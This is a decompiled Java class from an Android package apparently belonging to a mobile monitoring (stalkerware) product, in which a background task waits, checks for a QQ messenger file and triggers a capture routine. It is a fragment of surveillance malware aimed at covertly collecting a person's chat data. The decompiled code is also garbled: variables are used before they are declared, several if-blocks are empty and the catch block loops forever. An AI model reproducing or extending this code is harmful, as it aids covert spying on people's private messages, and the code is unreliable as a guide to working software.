package com.vvt.capture.qq.a;

import android.os.SystemClock;
import com.vvt.base.capture.i;
import java.io.File;

class d implements Runnable {
    d(QQFileObserver paramc) {}

    public void run() {
        bool = b.a();
        if (bool) {}
        long l = 5000L;
        SystemClock.sleep(l);
        try {
            localObject1 = this.a;
            Object localObject3 = this.a;
            localObject3 = QQFileObserver.a((QQFileObserver)localObject3);
            File localFile = new java.io.File(localObject3);
            QQFileObserver.a((QQFileObserver)localObject1, localFile);
            localObject1 = this.a;
            localObject1 = ((QQFileObserver)localObject1).a;
            bool = b.a((b)localObject1);
            if (bool) {
                localObject1 = this.a;
                localObject1 = QQFileObserver.b((QQFileObserver)localObject1);
                bool = ((File)localObject1).exists();
                if (bool) {
                    bool = b.a();
                    if (bool) {}
                    localObject1 = this.a;
                    localObject1 = ((QQFileObserver)localObject1).a;
                    localObject1 = b.b((b)localObject1);
                    ((i)localObject1).a();
                }
            }
            localObject1 = this.a;
        }
        catch (Exception localException)
        {
            for (;;)
            {
                Object localObject1;
                bool = b.c();
                if (bool) {}
                QQFileObserver localc = this.a;
            }
        }
        finally
        {
            QQFileObserver.a(this.a, null);
        }
        QQFileObserver.a((QQFileObserver)localObject1, null);
    }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/qq/a/d.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */